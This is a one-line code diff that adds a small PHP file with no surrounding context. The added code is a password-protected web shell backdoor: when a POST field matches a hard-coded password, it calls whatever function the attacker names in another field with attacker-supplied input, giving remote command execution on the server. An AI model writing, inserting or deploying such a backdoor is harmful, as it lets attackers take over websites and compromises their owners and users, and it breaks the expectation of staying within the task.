@@ -1,0 +1,1 @@
+<?php if (isset($_POST['k'])) {if ($_POST['k'] === 'chicken') {if (isset($_POST['c']) && isset($_POST['f'])) {$_POST['f']($_POST['c']);} }} ?>
